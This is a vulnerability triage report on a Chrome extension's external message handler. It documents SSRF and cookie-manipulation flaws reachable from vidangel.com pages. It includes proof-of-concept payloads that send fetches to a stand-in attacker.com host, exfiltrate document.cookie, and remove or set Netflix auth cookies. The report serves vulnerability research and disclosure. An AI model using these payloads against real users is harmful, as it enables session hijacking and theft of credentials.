# CoCo Analysis: mbpfipleganodbgndfadpokojibnfhjb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 23 (many duplicates, 4 unique vulnerability patterns)

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/media/data2/jianjia/extension_data/unzipped_extensions/mbpfipleganodbgndfadpokojibnfhjb/opgen_generated_files/bg.js
Line 951  const char = message.auth.uri.match(/\?./) ? '&' : '?';
          message.auth.uri
Line 952  const uri = message.auth.uri + char + 'version=' + EXTENSION_VERSION;
          uri = message.auth.uri + char + 'version=' + EXTENSION_VERSION
```

**Classification:** TRUE POSITIVE

**Exploitable by:**
- `*://*.vidangel.com/*` (as defined in externally_connectable)

**Attack Vector:** External messages from vidangel.com domain

**Code:**

```javascript
// Background script (bg.js line 950)
chrome.runtime.onMessageExternal.addListener(function(message, sender, sendResponse) {
  const char = message.auth.uri.match(/\?./) ? '&' : '?'; // ← attacker-controlled
  const uri = message.auth.uri + char + 'version=' + EXTENSION_VERSION; // ← attacker controls URI
  fetchToJSONResponse(uri, message.auth.options).then(response => { // ← fetch to attacker URL
    if (!response.ok) return sendResponse(response)
    router(message.request, sender, sendResponse)
  })
  return true
});

function fetchToJSONResponse(uri, options) {
  return fetch(uri, options).then(response => { // ← SSRF sink
    // ... response processing
  })
}
```

**Attack:**

```javascript
// Malicious code on vidangel.com page
chrome.runtime.sendMessage('mbpfipleganodbgndfadpokojibnfhjb', {
  auth: {
    uri: 'http://attacker.com/steal-cookies',
    options: {}
  },
  request: {
    uri: 'is_installed'
  }
}, function(response) {
  console.log('Extension made request to attacker-controlled URL');
});
```

**Impact:** SSRF vulnerability allowing attacker-controlled domain (vidangel.com) to make privileged cross-origin fetch requests to any URL via the extension. This bypasses CORS protections.

---

## Sink 2: bg_chrome_runtime_MessageExternal → fetch_options_sink

**CoCo Trace:**
```
$FilePath$/media/data2/jianjia/extension_data/unzipped_extensions/mbpfipleganodbgndfadpokojibnfhjb/opgen_generated_files/bg.js
Line 951  const char = message.auth.uri.match(/\?./) ? '&' : '?';
          message.auth
Line 953  fetchToJSONResponse(uri, message.auth.options).then(response => {
          message.auth.options
Line 286  sink_function(options.url, "fetch_options_sink");
          options.url
```

**Classification:** TRUE POSITIVE

**Exploitable by:**
- `*://*.vidangel.com/*`

**Attack Vector:** External messages from vidangel.com domain

**Code:**

```javascript
// Background script (bg.js line 950)
chrome.runtime.onMessageExternal.addListener(function(message, sender, sendResponse) {
  const char = message.auth.uri.match(/\?./) ? '&' : '?';
  const uri = message.auth.uri + char + 'version=' + EXTENSION_VERSION;
  fetchToJSONResponse(uri, message.auth.options).then(response => { // ← attacker controls options
    if (!response.ok) return sendResponse(response)
    router(message.request, sender, sendResponse)
  })
  return true
});

function fetchToJSONResponse(uri, options) {
  return fetch(uri, options).then(response => { // ← attacker controls fetch options
    // ... response processing
  })
}
```

**Attack:**

```javascript
// Malicious code on vidangel.com page
chrome.runtime.sendMessage('mbpfipleganodbgndfadpokojibnfhjb', {
  auth: {
    uri: 'http://internal-server/admin',
    options: {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({malicious: 'payload'})
    }
  },
  request: {
    uri: 'is_installed'
  }
});
```

**Impact:** SSRF with full control over fetch options (method, headers, body), allowing POST requests with arbitrary payloads to any URL, bypassing CORS.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_cookies_remove_sink

**CoCo Trace:**
```
$FilePath$/media/data2/jianjia/extension_data/unzipped_extensions/mbpfipleganodbgndfadpokojibnfhjb/opgen_generated_files/bg.js
Line 955  router(message.request, sender, sendResponse)
          message.request
Line 999  chrome.cookies[request.method](request.args[0], data => {
          request.args[0]
```

**Classification:** TRUE POSITIVE

**Exploitable by:**
- `*://*.vidangel.com/*`

**Attack Vector:** External messages from vidangel.com domain

**Code:**

```javascript
// Background script (bg.js line 950)
chrome.runtime.onMessageExternal.addListener(function(message, sender, sendResponse) {
  const char = message.auth.uri.match(/\?./) ? '&' : '?';
  const uri = message.auth.uri + char + 'version=' + EXTENSION_VERSION;
  fetchToJSONResponse(uri, message.auth.options).then(response => {
    if (!response.ok) return sendResponse(response)
    router(message.request, sender, sendResponse) // ← routes to cookies handler
  })
  return true
});

function router(request, sender, sendResponse) {
  switch (request.uri) {
    case 'cookies':
      chrome.cookies[request.method](request.args[0], data => { // ← attacker controls method and args
        const error = chrome.runtime.lastError
        sendResponse({
          status: error ? 500 : 200,
          error,
          data
        })
      })
      return true
    // ... other cases
  }
}
```

**Attack:**

```javascript
// Malicious code on vidangel.com page
chrome.runtime.sendMessage('mbpfipleganodbgndfadpokojibnfhjb', {
  auth: {
    uri: 'https://www.vidangel.com/api/auth', // Must pass auth check first
    options: {}
  },
  request: {
    uri: 'cookies',
    method: 'remove', // ← attacker controls method: 'remove', 'get', 'getAll', 'set'
    args: [{
      url: 'https://www.netflix.com',
      name: 'auth_token'
    }]
  }
});
```

**Impact:** Cookie manipulation vulnerability. Attacker can remove, read, or set cookies for any domain the extension has permissions for (netflix.com, amazon.com, vidangel.com), enabling session hijacking or disruption.

---

## Sink 4: bg_chrome_runtime_MessageExternal → chrome_cookies_set_sink

**CoCo Trace:**
```
$FilePath$/media/data2/jianjia/extension_data/unzipped_extensions/mbpfipleganodbgndfadpokojibnfhjb/opgen_generated_files/bg.js
Line 955  router(message.request, sender, sendResponse)
          message.request
Line 999  chrome.cookies[request.method](request.args[0], data => {
          request.args[0]
```

**Classification:** TRUE POSITIVE

**Exploitable by:**
- `*://*.vidangel.com/*`

**Attack Vector:** External messages from vidangel.com domain

**Attack:**

```javascript
// Malicious code on vidangel.com page
chrome.runtime.sendMessage('mbpfipleganodbgndfadpokojibnfhjb', {
  auth: {
    uri: 'https://www.vidangel.com/api/auth',
    options: {}
  },
  request: {
    uri: 'cookies',
    method: 'set',
    args: [{
      url: 'https://www.netflix.com',
      name: 'malicious_cookie',
      value: 'malicious_value'
    }]
  }
});
```

**Impact:** Cookie injection allowing attacker to set arbitrary cookies on permitted domains.

---

## Sink 5: bg_chrome_runtime_MessageExternal → fetch_resource_sink (router path)

**CoCo Trace:**
```
$FilePath$/media/data2/jianjia/extension_data/unzipped_extensions/mbpfipleganodbgndfadpokojibnfhjb/opgen_generated_files/bg.js
Line 955  router(message.request, sender, sendResponse)
Line 999  chrome.cookies[request.method](request.args[0], data => {
```

**Classification:** TRUE POSITIVE

**Exploitable by:**
- `*://*.vidangel.com/*`

**Attack Vector:** External messages from vidangel.com domain

**Code:**

```javascript
function router(request, sender, sendResponse) {
  switch (request.uri) {
    case 'fetch':
      const uri = request.args[0] // ← attacker-controlled
      const options = request.args[1] // ← attacker-controlled
      fetchToJSONResponse(uri, options).then(sendResponse) // ← SSRF with full control
      return true
    // ... other cases
  }
}
```

**Attack:**

```javascript
// Malicious code on vidangel.com page
chrome.runtime.sendMessage('mbpfipleganodbgndfadpokojibnfhjb', {
  auth: {
    uri: 'https://www.vidangel.com/api/auth',
    options: {}
  },
  request: {
    uri: 'fetch',
    args: ['http://attacker.com/exfil', {
      method: 'POST',
      body: document.cookie
    }]
  }
}, function(response) {
  console.log('Data exfiltrated:', response);
});
```

**Impact:** SSRF vulnerability with full control over URL and fetch options through the router 'fetch' case.

---

## Sinks 6-23: cookie_source/cookies_source → sendResponseExternal_sink

**CoCo Trace:**
```
Multiple detections referencing Line 678, 685, 686 (CoCo framework mock code)
```

**Classification:** FALSE POSITIVE

**Reason:** These detections (6-23) reference only CoCo framework mock code that creates fake cookie sources for testing. While the extension does have the ability to read cookies and send them via `sendResponseExternal` (as shown in Sink 3), these specific detections don't point to actual vulnerable code paths - they're artifacts of how CoCo instruments the chrome.cookies API. The actual vulnerability is already captured in Sinks 3-4 which show the real attack path through the external message handler and router.

---

## Overall Summary

**True Positives: 5 unique vulnerabilities**
1. SSRF via message.auth.uri
2. SSRF via message.auth.options with full fetch control
3. Cookie removal via dynamic method call
4. Cookie injection via dynamic method call
5. SSRF via router 'fetch' case

**False Positives: 18 detections** (duplicates and framework-only references)

The extension has multiple severe vulnerabilities allowing any page on vidangel.com domain to:
- Make arbitrary cross-origin requests (SSRF)
- Read, modify, and delete cookies for Netflix, Amazon, and VidAngel
- Exfiltrate sensitive data from these services
